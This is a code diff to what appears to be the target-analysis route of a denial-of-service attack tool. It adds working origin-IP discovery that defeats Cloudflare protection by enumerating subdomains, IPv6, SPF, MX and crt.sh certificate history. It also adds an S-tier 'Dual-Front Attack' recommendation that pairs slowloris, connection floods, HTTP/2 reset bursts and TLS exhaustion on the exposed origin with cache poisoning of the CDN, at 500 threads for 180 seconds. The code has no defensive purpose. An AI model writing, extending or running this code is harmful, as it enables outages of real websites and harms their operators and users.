@@ -19,6 +19,7 @@
 import { Router, type IRouter } from "express";
 import dns from "node:dns/promises";
 import net from "node:net";
+import https from "node:https";
 import { AnalyzeTargetBody } from "@workspace/api-zod";
 
 const router: IRouter = Router();
@@ -167,6 +168,138 @@ const SERVER_LABELS: Record<ServerType, string> = {
   unknown:     "Unknown",
 };
 
+// ── Cloudflare IP ranges (for origin discovery) ────────────────────────────
+const CF_CIDRS_ANALYZE = [
+  "173.245.48.0/20","103.21.244.0/22","103.22.200.0/22","103.31.4.0/22",
+  "141.101.64.0/18","108.162.192.0/18","190.93.240.0/20","188.114.96.0/20",
+  "197.234.240.0/22","198.41.128.0/17","162.158.0.0/15","104.16.0.0/13",
+  "104.24.0.0/14","172.64.0.0/13","131.0.72.0/22",
+].map(cidr => {
+  const [ip, mask] = cidr.split("/");
+  const p = ip.split(".").map(Number);
+  const n = ((p[0] << 24) | (p[1] << 16) | (p[2] << 8) | p[3]) >>> 0;
+  const m = mask === "0" ? 0 : (~((1 << (32 - Number(mask))) - 1)) >>> 0;
+  return [n, m, (n & m) >>> 0] as [number, number, number];
+});
+
+function isCloudflareIPAnalyze(ip: string): boolean {
+  const p = ip.split(".").map(Number);
+  if (p.length !== 4 || p.some(x => isNaN(x))) return false;
+  const n = ((p[0] << 24) | (p[1] << 16) | (p[2] << 8) | p[3]) >>> 0;
+  return CF_CIDRS_ANALYZE.some(([, m, net]) => (n & m) === net);
+}
+
+// ── crt.sh SSL certificate history (queries expired certs too) ────────────
+async function queryCrtShAnalyze(domain: string): Promise<string[]> {
+  const hosts = new Set<string>();
+  const url = `https://crt.sh/?q=%25.${encodeURIComponent(domain)}&output=json`;
+  const data = await new Promise<unknown>(resolve => {
+    const req = https.get(url, {
+      headers: { "User-Agent": "Mozilla/5.0 (compatible; SecurityResearch/1.0)", Accept: "application/json" },
+      rejectUnauthorized: false, timeout: 14000,
+    }, res => {
+      let d = ""; res.on("data", c => { d += c; }); res.on("end", () => { try { resolve(JSON.parse(d)); } catch { resolve(null); } });
+    });
+    req.on("error", () => resolve(null));
+    req.on("timeout", () => { req.destroy(); resolve(null); });
+  });
+  if (!Array.isArray(data)) return [];
+  const arr = data as Array<{ name_value?: string; common_name?: string }>;
+  for (const cert of arr) {
+    const names = [cert.name_value, cert.common_name].filter(Boolean).join("\n");
+    for (const name of names.split("\n")) {
+      const h = name.trim().replace(/^\*\./, "").toLowerCase();
+      if (h && h.includes(".") && !h.includes("*") && h.endsWith(domain)) hosts.add(h);
+    }
+  }
+  return [...hosts].slice(0, 40);
+}
+
+// ── Full origin IP finder — runs when CDN is detected ─────────────────────
+// Returns: { originIP, source, confidence }
+async function findOriginIP(
+  hostname: string,
+  allIPs:   string[],
+): Promise<{ originIP: string | null; source: string; confidence: "high" | "medium" | "low" }> {
+  const BYPASS_SUBS = [
+    "direct", "mail", "smtp", "origin", "backend", "server",
+    "api", "staging", "www2", "cpanel", "ftp", "webmail",
+    "admin", "old", "backup", "dev", "ns1", "ns2",
+    "pop", "imap", "relay", "host", "vpn", "ssh",
+  ];
+
+  // 1. Bypass subdomains
+  const subResults = await Promise.allSettled(
+    BYPASS_SUBS.map(async sub => {
+      const ips = await dns.resolve4(`${sub}.${hostname}`).catch(() => [] as string[]);
+      return { sub, ips };
+    })
+  );
+  for (const r of subResults) {
+    if (r.status !== "fulfilled") continue;
+    for (const ip of r.value.ips) {
+      if (!isCloudflareIPAnalyze(ip) && !allIPs.includes(ip)) {
+        return { originIP: ip, source: `subdomain:${r.value.sub}.${hostname}`, confidence: "high" };
+      }
+    }
+  }
+
+  // 2. IPv6 AAAA (often not proxied through Cloudflare free plan)
+  try {
+    const ipv6 = await dns.resolve6(hostname).catch(() => [] as string[]);
+    if (ipv6.length > 0) return { originIP: ipv6[0], source: "IPv6 AAAA record", confidence: "high" };
+  } catch { /* no IPv6 */ }
+
+  // 3. SPF/TXT records
+  try {
+    const txts = await dns.resolveTxt(hostname).catch(() => [] as string[][]);
+    for (const parts of txts) {
+      const spf = parts.join(" ");
+      const ms = spf.match(/ip4:([\d./]+)/g);
+      if (ms) {
+        for (const entry of ms) {
+          const candidate = entry.slice(4).split("/")[0];
+          if (candidate && !isCloudflareIPAnalyze(candidate) && !allIPs.includes(candidate)) {
+            return { originIP: candidate, source: "SPF TXT record", confidence: "medium" };
+          }
+        }
+      }
+    }
+  } catch { /* no TXT */ }
+
+  // 4. MX records
+  try {
+    const mx = await dns.resolveMx(hostname).catch(() => [] as { exchange: string; priority: number }[]);
+    for (const { exchange } of mx) {
+      const mxIPs = await dns.resolve4(exchange).catch(() => [] as string[]);
+      for (const ip of mxIPs) {
+        if (!isCloudflareIPAnalyze(ip) && !allIPs.includes(ip)) {
+          return { originIP: ip, source: `MX record (${exchange})`, confidence: "medium" };
+        }
+      }
+    }
+  } catch { /* no MX */ }
+
+  // 5. crt.sh SSL certificate history
+  const crtHosts = await queryCrtShAnalyze(hostname).catch(() => [] as string[]);
+  const crtResults = await Promise.allSettled(
+    crtHosts.map(async host => {
+      const ips = await dns.resolve4(host).catch(() => [] as string[]);
+      return { host, ips };
+    })
+  );
+  for (const r of crtResults) {
+    if (r.status !== "fulfilled") continue;
+    for (const ip of r.value.ips) {
+      if (!isCloudflareIPAnalyze(ip) && !allIPs.includes(ip)) {
+        return { originIP: ip, source: `crt.sh cert history (${r.value.host})`, confidence: "medium" };
+      }
+    }
+  }
+
+  return { originIP: null, source: "", confidence: "low" };
+}
+
 function scoreMethodsFor(opts: {
   isIP:              boolean;
   httpAvailable:     boolean;
@@ -185,11 +318,14 @@ function scoreMethodsFor(opts: {
   hasGraphQL:        boolean;
   hasWebSocket:      boolean;
   hostname:          string;
+  originIP?:         string | null;
+  originSource?:     string;
 }): MethodRec[] {
   const {
     isIP, httpAvailable, httpsAvailable, responseTimeMs,
     serverType, isCDN, cdnProvider, hasWAF, hasDNS,
     supportsH2, supportsH3, openPorts, hasGraphQL, hasWebSocket,
+    originIP, originSource,
   } = opts;
   const isWebServer = httpAvailable || httpsAvailable;
   const isSlowResponder     = responseTimeMs > 300;
@@ -709,6 +845,34 @@ function scoreMethodsFor(opts: {
     });
   }
 
+  // ── Origin Bypass — S-tier when real origin IP found behind CDN ──────────
+  if (originIP && isCDN) {
+    recs.push({
+      method: "origin-bypass",
+      name: "CDN Origin Bypass [Dual-Front Attack]",
+      score: 97,
+      tier: "S",
+      reason: `Real server IP discovered at ${originIP} (via ${originSource || "DNS enum"}) — bypasses ${cdnProvider || "CDN"} ENTIRELY. Dual-front: (1) http-pipeline+conn-flood+h2-rst-burst+slowloris+ssl-death direct on origin IP = Cloudflare protection irrelevant; (2) cache-poison+waf-bypass on CDN edges forces 100% origin miss rate, amplifying the direct attack. `,
+      suggestedThreads: 500,
+      suggestedDuration: 180,
+      protocol: "HTTP+TLS+TCP",
+      amplification: 2,
+    });
+  } else if (isCDN) {
+    // CDN detected but no origin found — recommend best CDN bypass strategy
+    recs.push({
+      method: "origin-bypass",
+      name: "CDN Origin Bypass [Auto-Discovery Mode]",
+      score: 78,
+      tier: "A",
+      reason: `${cdnProvider || "CDN"} detected — origin-bypass will auto-enumerate subdomains (mail, ftp, cpanel, staging, api, direct, etc.), IPv6 AAAA, SPF records, MX records and crt.sh cert history to find real IP. If found: dual-front attack on origin IP + CDN edge. If not found: falls back to bypass-storm + waf-bypass.`,
+      suggestedThreads: 400,
+      suggestedDuration: 180,
+      protocol: "HTTP+TLS+TCP",
+      amplification: 1.5,
+    });
+  }
+
   // Deduplicate and sort: real methods above simulated at equal score, all returned (no limit)
   return recs.sort((a, b) => {
     if (b.score !== a.score) return b.score - a.score;
@@ -886,12 +1050,12 @@ router.post("/analyze", async (req, res): Promise<void> => {
   }
   openPorts.sort((a, b) => a - b);
 
-  // ── Origin IP Discovery — find the real server IP behind CDN/WAF ────────
-  // Strategy 1: probe common subdomains that are often NOT behind CDN
-  // Strategy 2: parse SPF TXT record which often contains the real IP
-  // Strategy 3: check HTTP response for real-IP hints (X-Origin-Server, etc.)
-  let originIP: string | null   = null;
+  // ── Origin IP Discovery — comprehensive multi-technique finder ──────────
+  // Techniques: subdomain enum, IPv6 AAAA, SPF/TXT, MX, crt.sh SSL history
+  let originIP: string | null        = null;
   let originSubdomain: string | null = null;
+  let originSource: string           = "";
+  let originConfidence: string       = "";
   if (isCDN && !isIPv4 && hasDNS) {
     const CDN_BYPASS_SUBS = [
       "direct", "mail", "smtp", "ftp", "cpanel", "whm", "webmail",
@@ -927,7 +1091,7 @@ router.post("/analyze", async (req, res): Promise<void> => {
             s2.once("error",   () => { s2.destroy(); res(false); });
           });
         });
-        if (isOpen) { originIP = subIp; originSubdomain = r.fqdn; break; }
+        if (isOpen) { originIP = subIp; originSubdomain = r.fqdn; originSource = `subdomain:${r.fqdn}`; originConfidence = "high"; break; }
       }
     }
     // Strategy 2: parse SPF record for "ip4:" hints
@@ -943,6 +1107,8 @@ router.post("/analyze", async (req, res): Promise<void> => {
               const candidate = entry.slice(4).split("/")[0]; // strip CIDR
               if (candidate && !allIPs.includes(candidate)) {
                 originIP = candidate;
+                originSource = "SPF TXT record";
+                originConfidence = "medium";
                 break;
               }
             }
@@ -950,6 +1116,16 @@ router.post("/analyze", async (req, res): Promise<void> => {
           if (originIP) break;
         }
       } catch { /* no SPF */ }
+    }
+
+    // Strategy 3-5: full multi-technique finder (IPv6, MX, crt.sh)
+    if (!originIP) {
+      const found = await findOriginIP(hostname, allIPs).catch(() => ({ originIP: null, source: "", confidence: "low" as const }));
+      if (found.originIP) {
+        originIP = found.originIP;
+        originSource = found.source;
+        originConfidence = found.confidence;
+      }
     }
   }
 
@@ -980,13 +1156,15 @@ router.post("/analyze", async (req, res): Promise<void> => {
     hasGraphQL,
     hasWebSocket,
     hostname,
+    originIP,
+    originSource,
   });
 
   res.json({
-    target:          hostname,
+    target:            hostname,
     ip,
     allIPs,
-    isIP:            isIPv4,
+    isIP:              isIPv4,
     hasDNS,
     httpAvailable,
     httpsAvailable,
@@ -1008,6 +1186,8 @@ router.post("/analyze", async (req, res): Promise<void> => {
     openPorts,
     originIP,
     originSubdomain,
+    originSource:      originSource  || null,
+    originConfidence:  originConfidence || null,
     recommendations,
   });
 });
